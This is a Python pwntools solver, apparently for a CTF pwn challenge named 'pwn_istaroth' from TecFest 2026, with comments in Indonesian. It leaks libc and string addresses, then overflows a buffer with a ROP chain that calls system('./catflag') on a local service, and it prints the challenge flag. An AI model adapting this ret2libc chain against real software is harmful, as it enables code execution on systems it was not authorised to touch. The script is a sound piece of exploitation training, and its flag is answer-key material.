#!/usr/bin/env python3
"""
Solver pwn_istaroth - TecFest CyberSecurity 2026 (internal blackbox test)
Target : nc localhost 40501
Flag   : TecFest26{s33dS_0F_S70r13S_8R0u9h7_8y_7H3_W1Nd_aND_cUl71va73d_8Y_71m3}

Lihat WRITEUP.md untuk alur analisis lengkap.
"""
import os
import re
from pwn import *

context.log_level = 'info'
context.arch = 'amd64'

HOST, PORT = "localhost", 40501
HERE = os.path.dirname(os.path.abspath(__file__))
libc = ELF(os.path.join(HERE, "libc.so.6"), checksec=False)

PUTS_OFF, SYSTEM_OFF = libc.symbols['puts'], libc.symbols['system']
rop = ROP(libc)
POP_RDI_OFF = rop.find_gadget(['pop rdi', 'ret'])[0]
RET_OFF     = rop.find_gadget(['ret'])[0]

io = remote(HOST, PORT)
io.recvuntil(b"Istaroth: ritual dimulai.\n")

# Tahap 1: isi apa aja (>=0x41 byte) biar DWORD di offset 0x40 buffer != 0
# -> masuk cabang yang nge-leak &puts (libc) dan &"./catflag" via printf("%p %p").
io.send(b"A" * 65)

io.recvuntil(b"ramalan: ")
puts_leak, catflag_ptr = [int(x, 16) for x in re.findall(rb"0x[0-9a-fA-F]+", io.recv(64, timeout=2))[:2]]
libc_base = puts_leak - PUTS_OFF
system_addr, pop_rdi, ret_gadget = (libc_base + SYSTEM_OFF, libc_base + POP_RDI_OFF, libc_base + RET_OFF)
log.success(f"libc_base={hex(libc_base)} system={hex(system_addr)}")

# Tahap 2: overflow kedua -> timpa return address read_input() sendiri dgn ROP chain
# system("./catflag") memakai string yg alamatnya sudah dibocorkan di tahap 1.
payload  = b"A" * 80            # padding sampai saved-rbp
payload += b"B" * 8             # saved rbp (isi bebas)
payload += p64(pop_rdi) + p64(catflag_ptr)
payload += p64(ret_gadget)      # perataan stack 16-byte sebelum call system()
payload += p64(system_addr)
io.send(payload)

print(io.recvall(timeout=5).decode(errors="replace"))
io.close()
